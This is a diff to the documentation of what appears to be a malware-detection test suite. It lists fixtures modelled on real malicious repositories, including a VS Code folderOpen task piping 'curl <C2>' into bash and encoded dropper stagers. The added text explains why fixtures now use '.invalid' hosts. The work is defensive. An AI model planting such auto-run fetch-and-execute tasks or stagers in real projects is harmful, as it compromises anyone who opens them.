@@ -14,3 +14,15 @@ Cases are drawn from real repos surfaced by the hunt on 2026-07-07:
 - tp_dprk_folderopen   <- hvmgeeks/frontendengine1 (curl <C2> | bash on folderOpen)
 - tp_literal_py_stager <- embedded base64 literal that decodes to a network dropper
 - tp_marshal_stager    <- embedded marshal/zlib/base64 compiled payload
+
+## Fixtures must never carry a live attacker host
+
+`tp_dprk_folderopen` originally held the real C2 from the tracked campaign in a
+`runOn: folderOpen` task. Opening that directory as a folder in VS Code would
+have run the genuine dropper, and the repository is public, so the fixture
+shipped a working weapon to anyone who cloned it.
+
+The rules match on SHAPE, an automatic trigger plus a fetch piped into a shell,
+never on a particular hostname. A `.invalid` host (reserved by RFC 2606, so it
+can never resolve) tests exactly the same thing and cannot fire. Use one in any
+new fixture.
